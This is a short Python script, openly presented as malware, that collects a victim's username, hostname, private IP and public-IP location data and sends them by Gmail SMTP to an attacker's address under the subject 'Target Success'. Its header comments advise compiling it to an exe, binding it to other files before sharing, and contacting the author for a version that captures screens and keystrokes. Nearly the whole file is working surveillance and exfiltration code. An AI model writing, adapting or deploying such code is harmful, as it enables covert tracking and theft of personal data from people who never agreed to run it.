# -*-encoding:utf-8 -*-

#High End project which sends live-screen, screenshots, keylogs has also been maded.
#For getting it contact in person.
#Make it's exe file before sharing, Only afteryou fills your emails and pass.
#This is highly useful once it's binded!! ;) Contact in person 4 binding ideas.
__author__ = "Kush Choudhary"
__license__ = "MIT License"
__version__ = "1.0.1"
__maintainer__ = "Kush Choudhary"
__email__ = "ponderover8@gmail.com"
__status__ = "live"


import json
import socket
import getpass
from urllib.request import urlopen
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
import datetime as dt


#USERNAME
username=getpass.getuser()
#HOSTNAME
hostname=socket.gethostname()

#PRIVATE IP
privateIP=socket.gethostbyname(hostname)

#PUBLIC IP, CITY, REGION, COUNTRY, GEO COORDINATES, POSTAL, TELECOM
url = 'http://ipinfo.io/json'
response = urlopen(url)
data = json.load(response)
del(data['readme']) #don't need this


#CREATING EMAIL
fromaddr = "from_email_which_will_be_logged" #Make sure it's allowed to log in from less secure apps. ex bb@cc.com
toaddr = "to_email_where_info_is_sended" #ex aa@cc.com

# instance of MIMEMultipart 
msg = MIMEMultipart() 
  
# storing the senders email address   
msg['From'] = fromaddr
  
# storing the receivers email address  
msg['To'] = toaddr
  
# storing the subject  
msg['Subject'] = 'Target Success'

# string to store the body of the mail
data_c = {'Username':username, 'Hostname':hostname, 'PrivateIP':privateIP}
data_c.update(data)
data_r = str(data_c)
body = data_r

# attach the body with the msg instance 
msg.attach(MIMEText(body, 'plain'))

  
# creates SMTP session 
s = smtplib.SMTP('smtp.gmail.com', 587) 
  
# start TLS for security 
s.starttls() 
  
# Authentication 
s.login(fromaddr, "password") #PASSWORD FILL

# Converts the Multipart msg into a string 
text = msg.as_string()


# sending the mail 
s.sendmail(fromaddr, toaddr, text) 

# terminating the session 
s.quit() 

